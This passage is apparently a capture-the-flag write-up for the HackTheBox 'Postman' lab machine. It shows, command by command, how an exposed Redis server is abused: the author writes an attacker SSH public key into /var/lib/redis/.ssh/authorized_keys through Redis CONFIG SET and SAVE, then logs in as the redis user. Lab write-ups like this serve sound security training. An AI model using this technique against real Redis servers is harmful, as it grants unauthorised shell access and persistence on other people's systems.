We have access to the redis server. After checking some info we found the redis folder in the victim machine

```bash
10.10.10.160:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
```

Following **[this Hacktricks redis exploitation post](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh)** we can exploit this by authorize us in with ssh

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Postman-10.10.10.160]
└─$ ssh-keygen -t rsa
Generating public/private rsa key pair.

[...SNIP...]

┌──(kali㉿kali)-[~/Documents/Boxes/Postman-10.10.10.160]
└─$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt 

┌──(kali㉿kali)-[~/Documents/Boxes/Postman-10.10.10.160]
└─$ ls
id_rsa  id_rsa.pub  nmap  spaced_key.txt

┌──(kali㉿kali)-[~/Documents/Boxes/Postman-10.10.10.160]
└─$ cat spaced_key.txt| redis-cli -h 10.10.10.160 -x set ssh_key
OK
┌──(kali㉿kali)-[~/Documents/Boxes/Postman-10.10.10.160]
└─$ redis-cli -h 10.10.10.160        
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
┌──(kali㉿kali)-[~/Documents/Boxes/Postman-10.10.10.160]
└─$ ssh -i id_rsa redis@10.10.10.160

[...SNIP...]
redis@Postman:~$ whoami
redis
```

And we got a shell